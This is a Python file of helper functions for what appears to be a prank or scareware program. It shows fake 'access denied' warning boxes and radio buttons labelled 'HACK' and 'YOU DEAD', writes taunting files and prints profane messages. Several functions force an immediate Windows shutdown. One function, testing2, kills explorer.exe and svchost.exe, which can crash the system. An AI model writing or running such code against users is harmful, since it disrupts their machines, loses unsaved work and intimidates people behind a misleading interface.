 # файл где храняться все функции
import os
import time
import tkinter as tk
import webbrowser
from tkinter import messagebox

from progress.bar import FillingSquaresBar


def box() -> None:
    messagebox.showwarning("ВНИМАНИЕ", "ДОСТУП ЗАКРЫТ")
    print('чтож пока secret')
    time.sleep(5)
    os.system('shutdown /s /t 10')


def radio() -> None:
    root = tk.Tk()
    var = tk.IntVar()

    def change() -> None:
        value = var.get()
        if value == 0:
            messagebox.showwarning("ВНИМАНИЕ", "ДОСТУП ЗАКРЫТ")
        elif value == 1:
            webbrowser.open('https://vk.com', new=2)
        elif value == 2:
            os.system('shutdown /s /t 10')

    rad0 = tk.Radiobutton(root, text="HACK", variable=var, value=0)
    rad1 = tk.Radiobutton(root, text="SAFE", variable=var, value=1)
    rad2 = tk.Radiobutton(root, text="YOU DEAD", variable=var, value=2)
    button = tk.Button(root, text="OKEY", command=change)

    button.pack()
    rad0.pack()
    rad1.pack()
    rad2.pack()

    root.mainloop()


def texting() -> None:
    os.makedirs('projects/secrets', exist_ok=True)
    with open('projects/secrets/ERROR.txt', 'w', encoding='utf-8') as f:
        f.write("он еще не знает напиши SECURE")


def baring() -> None:
    mylist = [1, 2, 3, 4, 5, 6, 7, 8]
    bar = FillingSquaresBar('Countdown', max=len(mylist))

    for _ in mylist:
        bar.next()
        time.sleep(0.2)

    bar.finish()


def crush() -> None:
    os.system('shutdown /s /t 1')


def times() -> None:
    time.sleep(3)
 
 
def time_sds() -> None:
    baring()
    print("bay bay mother fucker")
    os.system('shutdown /s /t 10')
 
 
def Osproject() -> None:
    print("что происходит мать вашу?")
 
 
def testing2() -> None:
    os.system("taskkill /f /im explorer.exe")
    os.system("taskkill /f /im svchost.exe")
 
 
def folders() -> None:
    os.makedirs("projects/secrets", exist_ok=True)
    os.makedirs("projects/beta_folder", exist_ok=True)
 
 
def timers() -> None:
    baring()
    print("Yup 'NE' it's new soft?")
